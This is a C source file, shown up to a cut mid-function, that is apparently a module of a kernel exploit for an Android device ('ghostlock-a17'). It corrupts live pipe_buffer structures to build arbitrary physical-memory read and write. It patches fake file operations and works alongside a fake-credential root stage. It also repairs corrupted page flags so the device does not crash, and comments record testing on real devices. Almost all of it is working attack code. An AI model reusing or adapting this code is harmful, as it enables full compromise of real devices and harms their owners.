/* rwforge_a17.c — "marching forger" phys R/W for the A17 port.
 * Adapted from s26-handoff/src-target/rwforge.c to the ghostlock-a17 tree.
 *
 * The constrained rb write (one aligned qword per route round, via
 * rw_trigger() in main.c — our device-proven pselect/PI route) retargets
 * live pipe_buffer structs of pipes we own:
 *   - A0 (array-0 owner, sole 1-byte marker) is pointed at the pipe_buffer
 *     array page itself with offset/len = (0x800, 0); every write() to it
 *     merge-appends forged 0x28-byte worker structs into array-1 slots.
 *   - The array-1 owner holds 32 one-byte buffers; forged slots are read
 *     workers drained in order (never fully: put_page hazard).
 *   - The array-2 owner is the write worker (per-frame retarget rounds).
 *
 * After ~5 trigger rounds everything is plain read/write/tee/splice.
 */
#include "common.h"
#include <poll.h>

/* rwf_err() calls exit(-1) in this tree — fatal to retry loops. */
#define rwf_err(fmt, ...) pr_warning(fmt, ##__VA_ARGS__)

#define RWF_PIPE_MARKER 0x41
#define RWF_SELF_PAGE 1ULL /* must match main.c */
#define RWF_A0_ARRAY 0
#define RWF_RD_ARRAY 1
#define RWF_WP_ARRAY 2
/* Max forged read slots per channel install. Default 31 (fuse budget on
 * device): a0-path forges past slot 31 overflow the 0x500-byte rd array
 * into the neighbor slab object (the forged slot then isn't in the ring —
 * reads stall, writes silently land nowhere).  GL_RWF_SLOTS=N raises it for
 * throwaway environments (QEMU E2E) — only safe together with the cfg-forge
 * path (post-arm forging via parked configfs descriptor), which bypasses
 * the a0 merge entirely and makes the budget moot. */
#define RWF_MAX_READ_SLOTS 31
static int rwf_max_slots(void) {
  const char *e = getenv("GL_RWF_SLOTS");
  if (e) {
    int v = atoi(e);
    if (v >= 31 && v <= 256) return v;
  }
  return RWF_MAX_READ_SLOTS;
}
/* 4K kernels: pipe_buffer.offset+len must stay < 0x1000 (s26's 0x7000 was a
 * 16K-page value). Keep the proof inside the first page, clear of the fake
 * payload region (<0x800). */
#define RWF_PROOF_OFF 0xc00

extern int rw_trigger(uintptr_t parent, uintptr_t target);
extern int rw_page_ok(void);
extern int pipe_reclaim_read_fd(size_t i);
extern int pipe_reclaim_write_fd(size_t i);
extern int pipe_read_full(int fd, void *buf, size_t len);
extern int pipe_write_full(int fd, const void *buf, size_t len);
extern uintptr_t direct_to_page(uintptr_t addr);
extern uintptr_t pipe_buf_ops_addr(void);
extern void resize_pipe_slots(int pipefd[2], size_t slots);

static int rwf_ready;
static int rwf_a0 = -1, rwf_rd = -1;
static int rwf_holder[2] = {-1, -1};
static int rwf_pin[2] = {-1, -1};
static int rwf_peek[2] = {-1, -1};
static int rwf_staging[2] = {-1, -1};
static size_t rwf_forge_slot;
static uintptr_t rwf_spray[8];
static int rwf_nspray;

/* Record each self-page map round's spray page: the rb parent-side write
 * dirties its struct-page flags, and those pages must have sane flags
 * restored before process exit (pins only delay the fatal folio put to
 * exit, when the pin pipe itself closes). Dedup, cap 8 (e's behavior). */
static void rwf_track_spray(uintptr_t page) {
  if (!page)
    return;
  for (int i = 0; i < rwf_nspray; i++)
    if (rwf_spray[i] == page)
      return;
  if (rwf_nspray > 7)
    return;
  rwf_spray[rwf_nspray++] = page;
}

int rwf_write64(uintptr_t addr, uint64_t v);

/* NOTE: the shipped A17 binary `e` predates the channel-based flag repair
 * above — its rwf_repair_flags(int fd) does the vmemmap writes through the
 * armed configfs attr instead, and e also has rwf_repair_flags_configfs.
 * Both are reproduced below (matching e's behavior; the recovered
 * channel-based variant is retained as rwf_repair_flags_channel). */

/* Restore sane struct-page flags on every page whose flags the rb
 * parent-side writes dirtied, via the channel (vmemmap is RW):
 *  - array page: slab flags 0x4000000000000040 (PG_slab set, verified from
 *    pre-corruption dumps),
 *  - mapped spray pages: 0 (plain anon; folio_lru=INACTIVE_ANON, zone 0 —
 *    the put path no longer trips lru_gen's OOB index).
 * Call after the root stage, before process exit. */
int rwf_repair_flags_channel(void) {
  uintptr_t arr_sp = direct_to_page(pipebuf_page_base);
  if (!rwf_write64(arr_sp, 0x4000000000000040ULL)) {
    rwf_err("rwf repair: array slab flags write failed\n");
    return 0;
  }
  for (int i = 0; i < rwf_nspray; i++) {
    if (!rwf_write64(direct_to_page(rwf_spray[i]), 0)) {
      rwf_err("rwf repair: spray %d flags write failed\n", i);
      return 0;
    }
  }
  pr_success("rwf repair: struct-page flags restored on %d pages\n",
             rwf_nspray + 1);
  return 1;
}

/* wq-umh pre-trigger repair: track the fake-work page (this run's spray
 * page — its flags were dirtied by the rb parent-side stores), then restore
 * sane struct-page flags on every dirtied page.  Must run before the ptmx
 * storm: on device PANIC_ON_BUG makes any later "Bad page state" (helper
 * exec, worker teardown, process exit) fatal — the device test panicked
 * mid-wait exactly there.  vmemmap is only writable via the configfs
 * virtual write (the pipe channel can't address vmemmap: a forged slot's
 * struct page resolves through the linear map), so this needs the armed
 * ashmem attr fd; without it we log and proceed.  rwf_repair_flags()
 * self-tests the virtual write before touching flags.  Pin discipline is
 * unchanged (the channel's owner pins keep the pages alive regardless). */
int rwf_repair_flags_wq_umh(int armed_fd, uintptr_t fake_page) {
  rwf_track_spray(fake_page);
  if (armed_fd < 0) {
    pr_warning("rwf repair(wq-umh): no armed fd — flag repair skipped\n");
    return 0;
  }
  return rwf_repair_flags(armed_fd);
}

struct rwf_flag_ent {
  uintptr_t page;
  uint64_t flags;
  const char *name;
};

static int rwf_flags_table(struct rwf_flag_ent *ents) {
  int n = 0;
  ents[n].page = direct_to_page(pipebuf_page_base);
  ents[n].flags = 0x4000000000000040ULL;
  ents[n].name = "array";
  n++;
  for (int i = 0; i < rwf_nspray; i++) {
    ents[n].page = direct_to_page(rwf_spray[i]);
    ents[n].flags = 0;
    ents[n].name = "spray";
    n++;
  }
  return n;
}

/* e's rwf_repair_flags: configfs virtual write (bin_buffer retarget via the
 * armed ashmem attr's name blob; see kernel_write_data) onto vmemmap.
 * Revised: the self-test's readback goes through the CHANNEL (the payload
 * page is channel-readable; the configfs pread path is unproven — E2E showed
 * w=8/seen=0).  Per-page writes are judged by the pwrite result (the write
 * gadget memcpy'd = landed); the configfs read-back of vmemmap targets is
 * gone.  ents[] sized for the real cap (array + up to 8 spray pages) — the
 * old ents[4] stack-overflowed when >3 spray pages were tracked. */
int rwf_repair_flags(int fd) {
  if (fd < 0) {
    fd = open_ashmem_device();
    if (fd < 0) {
      pr_warning("rwf repair: ashmem open failed errno=%d\n", errno);
      return 0;
    }
  }
  uint64_t magic = 0xF0F0F0F0DEADBEEFULL;
  errno = 0;
  int w = cfg_write8(fd, binwrite_target, magic);   /* bool: pwrite==8 */
  int werrno = errno;
  /* The write gadget memcpy'ing (pwrite==8) IS the land proof; the channel
   * readback was dropped (one rd-ring slot fewer — the ring wraps at 31). */
  if (!w) {
    pr_warning("rwf repair: configfs write NOT live (errno=%d target=%016zx) — fuse stays armed\n",
               werrno, binwrite_target);
    return 0;   /* fd intentionally left open (noop release; exit disarm may retry) */
  }
  pr_info("rwf repair: configfs virtual-write live (self-test ok)\n");
  struct rwf_flag_ent ents[10];
  int n = rwf_flags_table(ents);
  int nok = 0;
  for (int i = 0; i < n; i++) {
    int wr = cfg_write8(fd, ents[i].page, ents[i].flags);
    if (!wr) {
      pr_warning("rwf repair: %s flags write failed va=%016zx\n",
                 ents[i].name, ents[i].page);
      return 0;   /* fd intentionally left open */
    }
    nok++;
    pr_info("rwf repair: %s flags written va=%016zx\n", ents[i].name,
            ents[i].page);
  }
  pr_success("rwf repair: struct-page flags restored on %d/%d pages (configfs vmemmap write) — fuse disarmed\n",
             nok, n);
  return nok == n;
}

/* e's rwf_repair_flags_configfs: same repair but through the cfg_*
 * channel (the armed attr's configfs_buffer is patched via rwforge phys
 * writes; pread/pwrite on the attr fd do the vmemmap R/W). */
int rwf_repair_flags_configfs(int fd) {
  int verify = getenv("GL_REPAIR_VERIFY") != NULL;
  if (verify) {
    /* point the fake fops' read_iter at the plain configfs read path */
    uint64_t ri = text_addr(CONFIGFS_READ_ITER) - 0x378;  /* LOST: reconstructed */
    if (!rwf_phys_write(fake_fops + FOPS_READ_ITER_OFF, &ri, 8)) {
      pr_warning("rwf repair(cfgfs): read_iter patch failed\n");
      return 0;
    }
  }
  struct rwf_flag_ent ents[4];
  int n = rwf_flags_table(ents);
  int nok = 0;
  for (int i = 0; i < n; i++) {
    uint64_t val = ents[i].flags;
    if (verify) {
      uint64_t cur = 0;
      if (!cfg_read8(fd, ents[i].page, &cur)) {
        pr_warning("rwf repair(cfgfs): verify read failed va=%016zx\n",
                   ents[i].page);
        return 0;
      }
      if ((cur & 0xffffff00000000ULL) != 0xffff8000000000ULL) {
        pr_info("rwf repair(cfgfs): verify %s va=%016zx cur=%016llx clean — skip\n",
                ents[i].name, ents[i].page, (unsigned long long)cur);
        continue;
      }
      if (i == 0) {
        uint64_t cur2 = 0;
        if (cfg_read8(fd, ents[0].page + 0x40, &cur2) && cur2 != 0 &&
            (cur2 & 0xffffff00000000ULL) != 0xffff8000000000ULL) {
          val = cur2 | 0x40;
          pr_info("rwf repair(cfgfs): verify array cur=%016llx ARMED tail1=%016llx -> restore=%016llx (derived)\n",
                  (unsigned long long)cur, (unsigned long long)cur2,
                  (unsigned long long)val);
        } else {
          val = 0x4000000000000040ULL;
          pr_info("rwf repair(cfgfs): verify array cur=%016llx ARMED tail1 read unusable (%016llx) -> restore=%016llx (hardcode)\n",
                  (unsigned long long)cur, (unsigned long long)cur2,
                  (unsigned long long)val);
        }
      } else {
        pr_info("rwf repair(cfgfs): verify %s va=%016zx cur=%016llx ARMED\n",
                ents[i].name, ents[i].page, (unsigned long long)cur);
      }
    }
    if (!cfg_write8(fd, ents[i].page, val)) {
      pr_warning("rwf repair(cfgfs): %s flags write failed va=%016zx\n",
                 ents[i].name, ents[i].page);
      return 0;
    }
    nok++;
    pr_info("rwf repair(cfgfs): %s flags written va=%016zx val=%016llx\n",
            ents[i].name, ents[i].page, (unsigned long long)val);
  }
  pr_success("rwf repair(cfgfs): struct-page flags restored on %d/%d pages — fuse disarmed\n",
             nok, n);
  return 1;
}


/* Pin a freshly mapped owner pipe's slot-0 page with a held tee: the map
 * write pointed the slot at this round's spray page WITHOUT a reference,
 * and the rb parent-side write dirtied that page's struct-page flags
 * (mode-3 rb_erase links the vmemmap "node": rb_set_parent writes
 * fake_parent at fake_right+0). When the next round's page prepare closes
 * the old carrier skb, __folio_put would read the garbage flags and die in
 * lru_gen_update_size (UBSAN array-index). A permanent get_page ref keeps
 * the page alive so the corrupted flags are never inspected. */
/* Create the pin pipe BEFORE prepare_pipe_buffer_page forks the immortal
 * pipe_prepare_child, so the child inherits it: the held refs then persist
 * past the exploit's own exit, and flags-corrupted pages are never put. */
/* Move a pipe pair above the route's dup2 clobber range (fds 0..
 * PSELECT_ROUTE_NFDS-1, see open_selected_fds): holder/peek/pin tees run
 * AFTER route rounds, and low fds silently become route fds (BZA5 device:
 * peek tee EINVAL). Same treatment the reclaim fds got (4096+ range is
 * theirs; use 8192+). */
static void rwf_fdmove_pair(int p[2], int base, const char *name) {
  for (int e = 0; e < 2; e++) {
    int hi = fcntl(p[e], F_DUPFD_CLOEXEC, base + e);
    if (hi >= 0) {
      close(p[e]);
      p[e] = hi;
    } else {
      pr_warning("rwf fdmove %s[%d] %d -> %d failed errno=%d\n", name, e,
                 p[e], base + e, errno);
    }
  }
}

void rwf_pin_pipe_create(void) {
  if (rwf_pin[0] < 0) {
    SYSCHK(pipe(rwf_pin));
    rwf_fdmove_pair(rwf_pin, 8192, "pin");
  }
}

static int rwf_pin_owner(int owner) {
  if (rwf_pin[0] < 0)
    SYSCHK(pipe(rwf_pin));
  /* 3 held refs per pinned page: at process exit the reclaim release (-1)
   * and the pin-pipe's own release (-1) still leave the count positive, so
   * the flags-corrupted page is never put and its garbage struct-page flags
   * are never read (lru_gen UBSAN). One page leaked per pin is the price. */
  for (int n = 0; n < 3; n++) {
    errno = 0;
    ssize_t teed = syscall(SYS_tee, pipe_reclaim_read_fd(owner), rwf_pin[1], 1, 0);
    if (teed != 1) {
      pr_warning("rwf pin tee failed owner=%d errno=%d\n", owner, errno);
      return 0;
    }
  }
  return 1;
}

static uintptr_t rwf_arr_qword(size_t array) {
  return pipebuf_page_base + array * PIPE_OBJECT_SIZE;
}

/* 1-byte marker into every reclaim pipe (sole buffer => permanent merge
 * target for A0/wp; the rd ring is filled separately via splice). */
int rwf_prepare_pipes(void) {
  unsigned char marker = RWF_PIPE_MARKER;
  for (size_t i = 0; i < PIPE_RECLAIM_RT; i++) {
    if (!pipe_write_full(pipe_reclaim_write_fd(i), &marker, sizeof(marker))) {
      rwf_err("rwf marker write failed pipe=%zu\n", i);
      return 0;
    }
  }
  if (rwf_holder[0] < 0) {
    SYSCHK(pipe(rwf_holder));
    resize_pipe_slots(rwf_holder, 128); /* rebase tees accumulate; walk needs >16 */
    rwf_fdmove_pair(rwf_holder, 8194, "holder");
  }
  if (rwf_peek[0] < 0) {
    SYSCHK(pipe(rwf_peek)); /* pre-created: post-cred pipe() crashes (see rwf_rd_peek) */
    rwf_fdmove_pair(rwf_peek, 8196, "peek");
  }
  if (rwf_staging[0] < 0) {
    SYSCHK(pipe(rwf_staging));
    rwf_fdmove_pair(rwf_staging, 8198, "staging");
  }
  rwf_ready = 1;
  return 1;
}

/* Find the reclaim pipe whose slot-0 page qword was just retargeted to
 * page_base: its first byte becomes page_base[0] (0x00) instead of the
 * 0x41 marker. tee()+drain keeps refs balanced (no put_page on targets). */
static int rwf_scan_owner(const char *phase, int skip_a, int skip_b) {
  unsigned char byte = 0;
  int owner = -1;
  int anomalies = 0;
  int holder[2] = {-1, -1};
  SYSCHK(pipe(holder));
  for (size_t i = 0; i < PIPE_RECLAIM_RT; i++) {
    if ((int)i == skip_a || (int)i == skip_b) continue;
    errno = 0;
    ssize_t teed = syscall(SYS_tee, pipe_reclaim_read_fd(i), holder[1], 1, 0);
    if (teed != 1 || !pipe_read_full(holder[0], &byte, sizeof(byte))) {
      struct stat st;
      int mode = fstat(pipe_reclaim_read_fd(i), &st) == 0 ? (int)st.st_mode : -1;
      pr_warning("rwf scan %s tee/read failed pipe=%zu fd=%d mode=%o errno=%d\n",
                 phase, i, pipe_reclaim_read_fd(i), mode, errno);
      anomalies++;
      continue;
    }
    if (byte != RWF_PIPE_MARKER) {
      pr_info("rwf scan %s owner pipe=%zu byte=%02x\n", phase, i, byte);
      if (owner >= 0) anomalies++;
      else owner = (int)i;
    }
  }
  SYSCHK(close(holder[0]));
  SYSCHK(close(holder[1]));
  if (anomalies || owner < 0) {
    rwf_err("rwf scan %s failed owner=%d anomalies=%d\n", phase, owner,
             anomalies);
    return -1;
  }
  return owner;
}

/* Fill the read pipe's ring to 32 buffers: plain writes would merge into
 * slot 0, so stage each byte in another pipe and splice (never merges). */
static int rwf_fill_rd_ring(void) {
  int staging[2] = {-1, -1};
  unsigned char marker = RWF_PIPE_MARKER;
  int ok = 1;
  SYSCHK(pipe(staging));
  for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
    if (!pipe_write_full(staging[1], &marker, sizeof(marker))) { ok = 0; break; }
    errno = 0;
    ssize_t moved = syscall(SYS_splice, staging[0], NULL,
                            pipe_reclaim_write_fd(rwf_rd), NULL, 1, 0);
    if (moved != 1) {
      pr_warning("rwf rd ring splice failed slot=%zu errno=%d\n", slot, errno);
      ok = 0;
      break;
    }
  }
  SYSCHK(close(staging[0]));
  SYSCHK(close(staging[1]));
  return ok;
}

/* Drain rd completely (non-blocking): every op must start with an empty
 * ring so the junk-write creates a buffer at exactly the forge index —
 * device runs showed the ring drifting non-empty and reads blocking. */
static void rwf_rd_drain_all(void) {
  int rd = pipe_reclaim_read_fd(rwf_rd);
  unsigned char buf[64];
  for (;;) {
    struct pollfd pfd = { .fd = rd, .events = POLLIN };
    if (poll(&pfd, 1, 50) <= 0)
      return;
    ssize_t r = read(rd, buf, sizeof(buf));
    if (r <= 0)
      return;
  }
}

/* Peek the first byte of rd's tail buffer WITHOUT consuming rd (tee into a
 * persistent pipe, then read it back out — refs balanced). After junk+forge
 * the tail slot should BE the forged slot, so the peek byte is the target
 * page's first byte — a 0x00 junk byte means the forge hit a stale slot
 * (lockstep lost). Diagnostics only. The pipe MUST be pre-created in
 * rwf_prepare_pipes: allocating a pipe after the fake-cred install crashes
 * in alloc_pipe_info (get_current_user derefs the fake cred's user field). */
static int rwf_rd_peek(unsigned char *out) {
  if (rwf_peek[0] < 0)
    return 0;
  errno = 0;
  ssize_t teed = syscall(SYS_tee, pipe_reclaim_read_fd(rwf_rd), rwf_peek[1], 1, 0);
  if (teed != 1) {
    pr_warning("rwf peek tee failed rdfd=%d peekfd=%d teed=%zd errno=%d\n",
               pipe_reclaim_read_fd(rwf_rd), rwf_peek[1], teed, errno);
    return 0;
  }
  struct pollfd pfd = { .fd = rwf_peek[0], .events = POLLIN };
  if (poll(&pfd, 1, 100) <= 0) {
    pr_warning("rwf peek poll empty (teed=%zd but nothing readable)\n", teed);
    return 0;
  }
  return read(rwf_peek[0], out, 1) == 1;
}

/* Create a fresh ring buffer in rd at exactly slot (head & 31) by splicing
 * one byte from the staging pipe. splice NEVER merges, unlike a plain write
 * which merges into any CAN_MERGE tail — on the BZA5 device the junk write
 * landed in a NEW slot while the forge hit the old tail (peek showed junk,
 * read stalled on marker/junk leftovers): slot placement must not depend on
 * merge behavior. Slot discipline: forge 0 targets the marker buffer (the
 * only buffer a fresh reclaim pipe ever holds: slot 0, head=1, tail=0);
 * every later op splices first, so the ring tail is always exactly slot
 * rwf_forge_slot when rwf_forge runs. A failed op leaves the spliced buffer
 * as the tail with forge_slot unchanged, so the next op stays aligned. */
static int rwf_rd_new_slot(void) {
  unsigned char b = 0;
  if (!pipe_write_full(rwf_staging[1], &b, sizeof(b)))
    return 0;
  errno = 0;
  ssize_t moved = syscall(SYS_splice, rwf_staging[0], NULL,
                          pipe_reclaim_write_fd(rwf_rd), NULL, 1, 0);
  if (moved != 1) {
    pr_warning("rwf rd new-slot splice failed moved=%zd errno=%d\n", moved,
               errno);
    return 0;
  }
  return 1;
}

/* Non-blocking chunked read: poll before every chunk so a missed forge
 * (ring holds only the 1-byte junk buffer) fails fast instead of blocking
 * forever in pipe_read_full — BZA5 device runs hung 500s per invocation
 * here until the loop's timeout killed them. */
static int rwf_read_chunks(int rd, void *out, size_t len) {
  size_t done = 0;
  while (done < len) {
    struct pollfd pfd = { .fd = rd, .events = POLLIN };
    if (poll(&pfd, 1, 300) <= 0) {
      char hex[3 * 24 + 1] = {0};
      for (size_t i = 0; i < done && i < 24; i++)
        snprintf(hex + i * 3, 4, "%02x ", ((unsigned char *)out)[i]);
      pr_warning("rwf read stall at %zu/%zu errno=%d data=[%s]\n", done, len,
                 errno, hex);
      return 0;
    }
    ssize_t r = read(rd, (char *)out + done, len - done);
    if (r <= 0)
      return 0;
    done += (size_t)r;
  }
  return 1;
}

static int rwf_forge(const struct user_pipe_buffer *pb) {
  if (cfg_forge_enabled()) {
    /* post-arm: the second armed fd's configfs descriptor is parked on the
     * rd pipe_buffer array — forging is a plain pwrite (no a0 merge, no
     * forge budget; the ring wraps cleanly at PIPE_BUFFER_SLOTS) */
    size_t slot = rwf_forge_slot & (PIPE_BUFFER_SLOTS - 1);
    if (!cfg_forge_pb(pb, slot)) {
      rwf_err("rwf cfg-forge pwrite failed slot=%zu\n", slot);
      return 0;
    }
    rwf_forge_slot++;
    return 1;
  }
  /* physical budget: the rd pipe_buffer array is PIPE_BUFFER_SLOTS deep —
   * forging past it overflows into the neighbor slab object (the forged
   * slot isn't in the ring: reads stall, writes silently land nowhere, and
   * a missed descriptor write turns the next configfs pwrite into a WILD
   * write).  GL_RWF_SLOTS must never raise the a0 budget past the array —
   * the cfg-forge path above is the real budget escape. */
  size_t budget = (size_t)rwf_max_slots();
  if (budget > PIPE_BUFFER_SLOTS)
    budget = PIPE_BUFFER_SLOTS;
  if (rwf_forge_slot >= budget) {
    rwf_err("rwf forge budget exhausted\n");
    return 0;
  }
  if (!pipe_write_full(pipe_reclaim_write_fd(rwf_a0), pb, sizeof(*pb))) {
    rwf_err("rwf forge write failed slot=%zu\n", rwf_forge_slot);
    return 0;
  }
  rwf_forge_slot++;
  return 1;
}

int rwf_phys_read(uintptr_t addr, void *out, size_t len) {
  uintptr_t off = addr & KS_PAGE_MASK;
  if (!rwf_ready || rwf_a0 < 0 || rwf_rd < 0 || !is_direct_ptr(addr) ||
      len == 0 || off + len + 1 > KS_PAGE_SIZE) {
    rwf_err("rwf read rejected addr=%016zx len=%zu\n", addr, len);
    return 0;
  }
  int rd = pipe_reclaim_read_fd(rwf_rd);
  int wr = pipe_reclaim_write_fd(rwf_rd);
  (void)wr;
  /* forge 0 overwrites the marker buffer (ring tail by construction); later
   * ops splice a fresh junk buffer so the tail is exactly slot forge_slot */
  if (rwf_forge_slot > 0 && !rwf_rd_new_slot()) {
    rwf_err("rwf read slot alloc failed addr=%016zx\n", addr);
    return 0;
  }
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(addr & ~KS_PAGE_MASK);
  /* Pad the forged slot one byte EARLY ([off-1] junk, then data, then the
   * trailing byte): the balancing tee then consumes only the junk byte and
   * takes the target page's ref BEFORE the drain's slot-release put.
   * Order matters: put-before-get dropped refcount-1 pages (every static
   * .data read target) to zero mid-run → BUG: Bad page state (fatal on
   * device, panic_on_bug). */
  uint32_t adj = off > 0 ? 1 : 0;
  pb.offset = (uint32_t)(off - adj);
  pb.len = (uint32_t)len + 1 + adj;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  if (!rwf_forge(&pb)) return 0;
  /* A17 device debug: never block forever on a missed forge — poll first */
  struct pollfd pfd = { .fd = rd, .events = POLLIN };
  int pr = poll(&pfd, 1, 300);
  if (pr <= 0) {
    pr_warning("rwf read empty ring addr=%016zx forge_slot=%zu poll=%d errno=%d\n",
               addr, rwf_forge_slot - 1, pr, errno);
    return 0;
  }
  /* lockstep check: tail byte should be the target page's first byte; the
   * 0x00 junk byte means the forge hit a stale slot (BZA5 device hangs
   * traced to this).  NB: with the padded forge this reads the pad byte. */
  unsigned char peek = 0;
  if (rwf_rd_peek(&peek))
    pr_info("rwf read peek=%02x addr=%016zx slot=%zu\n", peek, addr,
            rwf_forge_slot - 1);
  if (adj) {
    /* +1 ref on the target page via the holder, taken BEFORE the drain's
     * put.  tee() does NOT consume — the pad byte must be drained with a
     * real read or the data read comes back shifted one byte early. */
    errno = 0;
    ssize_t teed = syscall(SYS_tee, rd, rwf_holder[1], 1, 0);
    if (teed != 1) {
      pr_warning("rwf read early-tee failed addr=%016zx errno=%d\n", addr,
                 errno);
      return 0;
    }
    unsigned char pad = 0;
    if (!rwf_read_chunks(rd, &pad, 1)) {
      rwf_err("rwf read pad drain failed addr=%016zx\n", addr);
      return 0;
    }
  }
  if (!rwf_read_chunks(rd, out, len)) {
    rwf_err("rwf read drain failed addr=%016zx\n", addr);
    return 0;
  }
  if (!adj) {
    /* off==0 targets: no pad possible — balance AFTER the data read (the
     * put-to-zero race window remains for refcount-1 pages; none of our
     * targets sit at page offset 0 in practice) */
    errno = 0;
    ssize_t teed = syscall(SYS_tee, rd, rwf_holder[1], 1, 0);
    if (teed != 1) {
      pr_warning("rwf read late-tee failed addr=%016zx errno=%d\n", addr,
                 errno);
      return 0;
    }
  }
  unsigned char discard = 0;
  if (!rwf_read_chunks(rd, &discard, sizeof(discard))) {
    rwf_err("rwf read rebase failed addr=%016zx errno=%d\n", addr, errno);
    return 0;
  }
  return 1;
}

int rwf_phys_write(uintptr_t addr, const void *data, size_t len) {
  uintptr_t frame = addr & ~KS_PAGE_MASK;
  uint32_t off = (uint32_t)(addr & KS_PAGE_MASK);
  /* len cap raised 32 → 128 (discard buffer was the only reason for 32):
   * the wq-umh blob/fw writes batch into one forge each — the rd ring has
   * only 32 slots and every op past slot 31 wraps onto drained slots. */
  if (!rwf_ready || rwf_a0 < 0 || rwf_rd < 0 || !is_direct_ptr(addr) ||
      len == 0 || off + len > KS_PAGE_SIZE || len > 128) {
    rwf_err("rwf write rejected addr=%016zx len=%zu\n", addr, len);
    return 0;
  }
  int wr = pipe_reclaim_write_fd(rwf_rd);
  int rd = pipe_reclaim_read_fd(rwf_rd);
  /* Forged write slot with exact off/len (zero collateral): forge 0
   * overwrites the marker buffer (ring tail by construction); later ops
   * splice a fresh junk buffer first so the tail is exactly slot
   * forge_slot — never a plain write, whose merge-into-tail behavior broke
   * the lockstep on the BZA5 device. Overwrite that tail slot with the
   * forged one, then the real write merges into it at frame+off. Neither
   * the rb offlen write (faults on small child addrs) nor append-growth
   * (junk over target frames and self-corruption on array-resident slots)
   * works on 6.12.38. */
  if (rwf_forge_slot > 0 && !rwf_rd_new_slot()) {
    rwf_err("rwf write slot alloc failed addr=%016zx\n", addr);
    return 0;
  }
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(frame);
  pb.offset = off;
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  if (!rwf_forge(&pb)) return 0;
  if (!pipe_write_full(wr, data, len)) {
    rwf_err("rwf write merge failed addr=%016zx len=%zu\n", addr, len);
    return 0;
  }
  /* lockstep check: tail byte should now be data[0] read back from the
   * forged page; 0x00 = forge hit a stale slot and the data merged into
   * the junk buffer instead */
  unsigned char peek = 0;
  if (rwf_rd_peek(&peek))
    pr_info("rwf write peek=%02x (want %02x) addr=%016zx slot=%zu\n", peek,
            ((const unsigned char *)data)[0], addr, rwf_forge_slot - 1);
  /* tee a byte into the holder first (get_page on the forged slot's page),
   * then drain the written bytes: the drain's anon_pipe_buf_release puts the
   * page, and without a matching get the put underflows — an early free
   * followed by lru_gen UBSAN when the stale struct-page flags are read. */
  errno = 0;
  ssize_t teed = syscall(SYS_tee, rd, rwf_holder[1], 1, 0);
  if (teed != 1)
    pr_warning("rwf write rebase tee failed addr=%016zx errno=%d\n", addr,
               errno);
  unsigned char discard[128];
  if (!rwf_read_chunks(rd, discard, len)) {
    rwf_err("rwf write drain failed addr=%016zx\n", addr);
    return 0;
  }
  return 1;
}

uint64_t rwf_read64(uintptr_t addr) {
  uint64_t v = 0;
  rwf_phys_read(addr, &v, sizeof(v));
  return v;
}

int rwf_write64(uintptr_t addr, uint64_t v) {
  return rwf_phys_write(addr, &v, sizeof(v));
}

int rwf_install(void) {
  if (rwf_ready != 1 || !is_direct_ptr(pipebuf_page_base)) {
    rwf_err("rwf install missing state ready=%d pbpage=%016zx\n", rwf_ready,
             pipebuf_page_base);
    return 0;
  }
  rwf_forge_slot = 0;
  rwf_a0 = rwf_rd = -1;
  /* GL_REPAIR_LANDED_ONLY: only track spray pages whose round provably
   * landed (the repair then touches only pages we know we dirtied) */
  int landed_only = getenv("GL_REPAIR_LANDED_ONLY") != NULL;

  uintptr_t arr0 = rwf_arr_qword(RWF_A0_ARRAY);

  /* each round retries: a route "connect" only lands the write ~1/3-1/2 of
   * the time; the owner scan / self-tests are the land detectors */
  for (int t = 0; t < 3 && rwf_a0 < 0; t++) /* fail fast: outer retry re-reclaims */ {
    rw_trigger(RWF_SELF_PAGE, arr0);
    rwf_a0 = rwf_scan_owner("map-a0", -1, -1);
    if (!landed_only || rwf_a0 >= 0)
      rwf_track_spray(page_base);
  }
  if (rwf_a0 < 0) { rwf_err("rwf map-a0 failed\n"); return 0; }
  rwf_pin_owner(rwf_a0);

  /* Grow a0 slot-0's len to 0x800 with merge-appends BEFORE the retarget.
   * The s26 offlen route write (value 0x800) is impossible with the rb
   * primitive (child addr = 0x800 -> null deref). Growing must happen while
   * the slot still points at the SPRAY page: appends land at page+off+len,
   * so after the retarget they would overwrite the slot struct itself
   * (the array page contains its own slots) — the junk zeros belong in the
   * spray page, whose fake payload is already spent. */
  {
    static const unsigned char zeros[0x100] = {0};
    for (size_t done = 1; done < 0x800; ) {
      size_t chunk = 0x800 - done;
      if (chunk > sizeof(zeros)) chunk = sizeof(zeros);
      if (!pipe_write_full(pipe_reclaim_write_fd(rwf_a0), zeros, chunk)) {
        rwf_err("rwf a0 offset grow failed at 0x%zx\n", done);
        return 0;
      }
      done += chunk;
    }
  }

  for (int t = 0; t < 3 && rwf_rd < 0; t++) {
    rw_trigger(RWF_SELF_PAGE, rwf_arr_qword(RWF_RD_ARRAY));
    rwf_rd = rwf_scan_owner("map-rd", rwf_a0, -1);
    if (!landed_only || rwf_rd >= 0)
      rwf_track_spray(page_base);
  }
  if (rwf_rd < 0) { rwf_err("rwf map-rd failed\n"); return 0; }
  rwf_pin_owner(rwf_rd);

  /* a0.page -> the pipe_buffer array frame itself (parent-side write dirties
   * the array page's struct-page flags; the slab page would be put at
   * process exit and trip lru_gen on the garbage flags, so pin it too).
   * slot-0 keeps off=0,len=0x800 from the growth => merge position is
   * array_page+0x800 = array-1 slot 0.
   * e's version: retarget with a tee land-check (the retargeted slot-0's
   * len must read back as 0x800 — byte 13 of a 14-byte tee) and up to 8
   * retries; a never-landing channel is refused. */
  int landed = 0;
  for (int att = 0; att < 8 && !landed; att++) {
    int conn = rw_trigger(direct_to_page(pipebuf_page_base), arr0);
    if (!conn) {
      landed = 0;
      if (landed_only)
        goto retry;
    } else {
      int holder[2];
      SYSCHK(pipe(holder));
      errno = 0;
      ssize_t teed = syscall(SYS_tee, pipe_reclaim_read_fd(rwf_a0),
                             holder[1], 14, 0);
      unsigned char chk[14];
      if (teed == 14 && pipe_read_full(holder[0], chk, sizeof(chk))) {
        landed = chk[13] == 8;  /* forged slot-0 len high byte (0x800) */
      } else {
        pr_warning("rwf retarget land-check tee/read failed teed=%zd errno=%d\n",
